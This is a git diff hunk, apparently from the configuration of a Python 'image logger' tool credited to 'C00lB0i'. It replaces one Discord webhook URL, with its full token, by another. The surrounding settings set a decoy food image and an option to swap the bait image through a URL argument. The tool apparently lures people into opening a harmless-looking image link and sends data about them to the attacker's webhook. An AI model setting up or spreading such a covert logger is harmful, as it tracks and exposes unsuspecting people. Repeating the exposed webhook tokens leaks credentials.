@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1402391109677875301/has_3pZHwRsBkTDM1CYxzCV_DUh_F6XqKcOiwIyRxHY7d_QOtU5g4OkZLhinDq8vHzlN",
+    "webhook": "https://discord.com/api/webhooks/1405354889932177429/Fg2l_h6QQOOLkVC029ghvAAX_iUo5en6hSW2i394uJ5bVNgRvJs1yF_MZ2ZNzczqc_8v",
     "image": "https://horizon.com/wp-content/uploads/recipe-cin-roll-hero.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
